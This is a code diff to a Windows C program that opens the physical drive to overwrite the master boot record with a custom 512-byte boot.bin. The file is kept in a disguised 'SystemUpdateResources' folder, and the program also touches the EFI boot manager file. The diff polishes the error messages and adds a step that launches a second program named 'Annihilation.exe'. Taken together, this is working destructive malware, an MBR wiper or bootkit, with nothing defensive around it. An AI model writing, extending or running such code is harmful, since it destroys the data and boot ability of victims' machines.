@@ -10,19 +10,19 @@ int main()
     // Overwrite the MBR
     HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
     if (drive == INVALID_HANDLE_VALUE) {
-        printf("Error opening a handle to the drive.");
+        printf("Error opening a handle to the drive.\n");
         return -1;
     }
 
     HANDLE binary = CreateFileW(L"C:\\Windows\\SystemUpdateResources\\boot.bin", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
     if (binary == INVALID_HANDLE_VALUE) {
-        printf("Error opening a handle to boot.bin");
+        printf("Error opening a handle to boot.bin.\n");
         return -1;
     }
 
     DWORD size = GetFileSize(binary, 0);
     if (size != 512) {
-        printf("Error opening a handle to boot.bin");
+        printf("Error: boot.bin size is not 512 bytes.\n");
         return -1;
     }
 
@@ -37,7 +37,7 @@ int main()
     }
     else
     {
-        printf("Error reading boot.bin\n");
+        printf("Error reading boot.bin.\n");
         printf("Make sure to compile the ASM file with 'nasm -f bin -o boot.bin boot.asm'\n");
     }
 
@@ -58,6 +58,34 @@ int main()
     else
     {
         printf("Failed to copy bootmgfw.efi.\n");
+    }
+
+    // Execute Annihilation.exe
+    printf("Executing Annihilation.exe...\n");
+    STARTUPINFO si = { sizeof(STARTUPINFO) };
+    PROCESS_INFORMATION pi = { 0 };
+
+    if (CreateProcess(
+        L"Annihilation.exe",    // Path to Annihilation.exe
+        NULL,                   // Command line arguments
+        NULL,                   // Process security attributes
+        NULL,                   // Thread security attributes
+        FALSE,                  // Inherit handles
+        0,                      // Creation flags
+        NULL,                   // Environment block
+        NULL,                   // Current directory
+        &si,                    // Startup information
+        &pi))                   // Process information
+    {
+        printf("Annihilation.exe started successfully.\n");
+        // Wait for the process to finish
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+    else
+    {
+        printf("Failed to execute Annihilation.exe.\n");
     }
 
     return 0;
